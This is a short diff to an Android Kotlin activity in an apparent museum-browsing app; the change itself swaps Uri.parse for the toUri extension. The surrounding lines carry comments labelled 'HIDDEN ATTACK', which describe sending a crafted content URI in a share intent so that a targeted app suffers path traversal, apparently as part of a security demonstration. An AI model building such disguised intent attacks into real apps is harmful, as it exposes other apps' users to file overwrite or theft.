@@ -2,7 +2,6 @@ package com.artexplorer.museum
 
 import android.content.ComponentName
 import android.content.Intent
-import android.net.Uri
 import android.os.Bundle
 import android.util.Log
 import android.widget.Toast
@@ -12,9 +11,11 @@ import androidx.compose.foundation.layout.fillMaxSize
 import androidx.compose.material3.MaterialTheme
 import androidx.compose.material3.Surface
 import androidx.compose.ui.Modifier
+import androidx.core.net.toUri
 import com.artexplorer.museum.data.MuseumObject
 import com.artexplorer.museum.ui.MuseumApp
 import com.artexplorer.museum.ui.theme.MuseumTheme
+
 
 class MuseumActivity : ComponentActivity() {
 
@@ -69,7 +70,8 @@ Shared via Art Explorer app ✨
 
                 // 🚨 HIDDEN ATTACK: Add malicious URI that triggers path traversal
                 // This URI will cause the ArtworkContentProvider to return a malicious filename
-                val maliciousUri = Uri.parse("content://com.artexplorer.museum.artworks/share/${artwork.objectID}")
+                val maliciousUri =
+                    "content://com.artexplorer.museum.artworks/share/${artwork.objectID}".toUri()
                 putExtra(Intent.EXTRA_STREAM, maliciousUri)
 
                 // Target the vulnerable app specifically (when available)
